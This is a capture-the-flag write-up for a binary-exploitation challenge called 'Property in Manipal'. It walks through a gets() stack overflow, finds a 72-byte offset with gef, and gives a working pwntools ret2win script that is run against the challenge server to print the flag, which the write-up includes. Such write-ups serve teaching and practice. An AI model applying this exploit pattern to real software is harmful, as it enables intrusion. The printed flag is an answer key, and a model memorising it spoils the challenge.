# Property in Manipal  

Was provided with a binary called `manipal`. 

`file` output: 

```
manipal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c59d3922c57c2579bfa468ff6b8745bb99f107f5, for GNU/Linux 4.4.0, not stripped
```

`checksec` output: 

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   35 Symbols	  No	0		3		manipal
```

Considering `NX` is enabled, we won't be able to execute off of the stack 

Lets decompile the binary to see the code. 

```c
int win()
{
  return system("cat flag.txt");
}
__int64 vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  printf("Enter your name to signup for the property: ");
  fflush(stdout);
  read(0, buf, 0x40u);
  printf("Hello, ");
  printf(buf);
  putchar(10);
  printf("Enter the amount for customizations: ");
  fflush(stdout);
  return gets(buf);
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("I bought a property in Mandavi");
  puts("& what they do for you is,");
  puts("they give you the property.");
  vuln();
  return 0;
}
```

As we can see, in the `vuln` function, `gets` is used which is clearly vulnerable to buffer overflow attacks. 

Considering `NX` bit is enabled, we need to create a `ROP` Chain in order to execute the `win` function as we can't execute the `win` function directly off of the stack.  

I found the offset using `pattern create`  and `pattern search` commands of `gef`

```
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffd930  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x00007fffffffdaa8  →  0x00007fffffffde4c  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
$rcx   : 0x00007ffff7e038e0  →  0x00000000fbad208b
$rdx   : 0x0
$rsp   : 0x00007fffffffd978  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00007ffff7e03963  →  0xe05720000000000a ("\n"?)
$rdi   : 0x00007ffff7e05720  →  0x0000000000000000
$rip   : 0x000000000040124d  →  <vuln+00a1> ret
$r8    : 0x0
$r9    : 0x0
$r10   : 0x00007ffff7c0e008  →  0x00110022000047e8
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0000000000403df0  →  0x0000000000401160  →   endbr64
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd978│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"	 ← $rsp
0x00007fffffffd980│+0x0008: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffd988│+0x0010: "laaaaaaamaaa"
0x00007fffffffd990│+0x0018: 0x00007f006161616d ("maaa"?)
0x00007fffffffd998│+0x0020: 0x00007fffffffdaa8  →  0x00007fffffffde4c  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
0x00007fffffffd9a0│+0x0028: 0x0000000100400040 ("@"?)
0x00007fffffffd9a8│+0x0030: 0x000000000040124e  →  <main+0000> push rbp
0x00007fffffffd9b0│+0x0038: 0x00007fffffffdaa8  →  0x00007fffffffde4c  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401246 <vuln+009a>      call   0x401080 <gets@plt>
     0x40124b <vuln+009f>      nop
     0x40124c <vuln+00a0>      leave
 →   0x40124d <vuln+00a1>      ret
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "manipal", stopped 0x40124d in vuln (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40124d → vuln()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search j
[+] Searching for '6a'/'6a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

Now that I have found the offset, I have to now find the address for a valid `ROP` gadget. 

I did that by using the program `ROPgadget` and running the following command: 

```
> ROPgadget --binary ./manipal | grep "ret"
```

I chose this as my preferred `ROP` gadget: `0x000000000040101a : ret`

Finally, I wrote a script to combine everything and pass in the payload

`script.py:`
```python
from pwn import * 

elf = ELF('./manipal')

win = p64(elf.symbols['win']) 
main = p64(elf.symbols['main']) 
vuln = p64(elf.symbols['vuln']) 

ret_addr = p64(0x000000000040101a)

p = remote('propertyinmanipal.nitephase.live', 42586)
payload = b"A"*72
payload += ret_addr 
payload += win

print(payload)
print(ret_addr)

p.sendlineafter(b'Enter your name to signup for the property:', b'something')

p.sendlineafter(b'Enter the amount for customizations', payload)

p.interactive()
```

Output: 

```
[*] '/home/haard/Documents/recruitment/haard_phase2/binex/property_in_manipal/src/manipal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[┤] Opening connection to propertyinmanipal.nitephase.live on port 42586: Trying 13[+] Opening connection to propertyinmanipal.nitephase.live on port 42586: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00\x96\x11@\x00\x00\x00\x00\x00'
b'\x1a\x10@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
: nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}

[*] Got EOF while reading in interactive
```

**flag:** `nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}`

References: 
- https://www.youtube.com/watch?v=8zRoMAkGYQE
- https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions

